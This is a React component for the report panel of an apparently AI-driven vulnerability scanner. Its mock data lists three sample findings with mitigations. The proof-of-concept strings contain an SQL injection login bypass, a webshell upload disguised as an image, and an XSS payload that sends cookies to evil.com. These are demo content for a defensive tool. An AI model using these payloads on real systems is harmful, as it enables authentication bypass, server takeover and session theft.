import { useState } from "react";
import { FileText, X, Download, Bug, ShieldCheck, Code } from "lucide-react";
import { Button } from "@/components/ui/button";

const MOCK_REPORT = {
  vulnerabilities: [
    {
      name: "SQL Injection in Authentication Module",
      severity: "critical",
      description: "The login endpoint at /api/auth/login does not sanitize user input, allowing direct SQL injection via the 'username' parameter.",
      poc: `curl -X POST https://target.com/api/auth/login \\
  -d "username=admin' OR '1'='1'--&password=anything"
  
# Response: 200 OK — Authentication bypassed`,
      mitigation: "Use parameterized queries or prepared statements. Implement input validation with allowlists. Deploy a Web Application Firewall (WAF) to catch injection attempts.",
    },
    {
      name: "Remote Code Execution via File Upload",
      severity: "critical",
      description: "The file upload endpoint allows uploading of arbitrary file types including .php and .jsp files without validation.",
      poc: `curl -X POST https://target.com/api/upload \\
  -F "file=@webshell.php;type=image/jpeg"

# Shell accessible at: https://target.com/uploads/webshell.php`,
      mitigation: "Validate file types on server-side using magic bytes. Store uploaded files outside the web root. Rename files to random hashes. Set Content-Disposition headers.",
    },
    {
      name: "Cross-Site Scripting (Reflected)",
      severity: "high",
      description: "The search parameter reflects user input without encoding, enabling script execution in the victim's browser.",
      poc: `https://target.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`,
      mitigation: "Encode all output using context-appropriate encoding. Implement Content-Security-Policy headers. Use frameworks that auto-escape output.",
    },
  ],
};

const SEV_STYLE: Record<string, string> = {
  critical: "text-cyber-red border-cyber-red/30 bg-cyber-red/10",
  high: "text-cyber-orange border-cyber-orange/30 bg-cyber-orange/10",
  medium: "text-cyber-yellow border-cyber-yellow/30 bg-cyber-yellow/10",
  low: "text-cyber-blue border-cyber-blue/30 bg-cyber-blue/10",
};

export default function BottomPanel() {
  const [open, setOpen] = useState(false);

  if (!open) {
    return (
      <div className="fixed bottom-6 left-1/2 -translate-x-1/2 z-40">
        <Button
          onClick={() => setOpen(true)}
          className="glass-panel border-primary/30 bg-card/60 text-primary hover:bg-primary/10 font-mono text-xs tracking-wider gap-2 px-6 py-5"
        >
          <FileText className="w-4 h-4" />
          VIEW DETAILED AI REPORT
        </Button>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/80 backdrop-blur-sm">
      <div className="glass-panel w-full max-w-4xl max-h-[85vh] mx-6 overflow-hidden flex flex-col">
        {/* Header */}
        <div className="flex items-center justify-between p-5 border-b border-border/50">
          <div className="flex items-center gap-3">
            <ShieldCheck className="w-5 h-5 text-primary" />
            <h2 className="font-mono text-sm tracking-wider text-foreground uppercase">
              AI Vulnerability Report
            </h2>
          </div>
          <div className="flex items-center gap-2">
            <Button
              size="sm"
              className="bg-primary/10 text-primary hover:bg-primary/20 font-mono text-[10px] tracking-wider gap-1"
              onClick={() => {
                const blob = new Blob([JSON.stringify(MOCK_REPORT, null, 2)], { type: "application/json" });
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.href = url;
                a.download = "vhunter-report.json";
                a.click();
              }}
            >
              <Download className="w-3 h-3" />
              EXPORT
            </Button>
            <button onClick={() => setOpen(false)} className="text-muted-foreground hover:text-foreground transition-colors">
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Body */}
        <div className="flex-1 overflow-y-auto cyber-scrollbar p-5 space-y-6">
          {MOCK_REPORT.vulnerabilities.map((vuln, i) => (
            <div key={i} className="bg-muted/30 rounded-lg p-5 space-y-4">
              {/* Title & Severity */}
              <div className="flex items-start justify-between gap-4">
                <div className="flex items-center gap-2">
                  <Bug className="w-4 h-4 text-cyber-red flex-shrink-0" />
                  <h3 className="font-mono text-sm text-foreground">{vuln.name}</h3>
                </div>
                <span className={`text-[10px] font-mono uppercase px-2 py-0.5 rounded border ${SEV_STYLE[vuln.severity]}`}>
                  {vuln.severity}
                </span>
              </div>

              {/* Description */}
              <p className="text-xs text-muted-foreground leading-relaxed">{vuln.description}</p>

              {/* PoC */}
              <div>
                <div className="flex items-center gap-1 text-[10px] text-primary font-mono uppercase mb-2">
                  <Code className="w-3 h-3" />
                  Proof of Concept
                </div>
                <pre className="bg-background/80 rounded-md p-3 text-[11px] font-mono text-cyber-cyan/90 overflow-x-auto whitespace-pre-wrap">
                  {vuln.poc}
                </pre>
              </div>

              {/* Mitigation */}
              <div>
                <div className="flex items-center gap-1 text-[10px] text-cyber-green font-mono uppercase mb-2">
                  <ShieldCheck className="w-3 h-3" />
                  Mitigation
                </div>
                <p className="text-xs text-muted-foreground leading-relaxed">{vuln.mitigation}</p>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
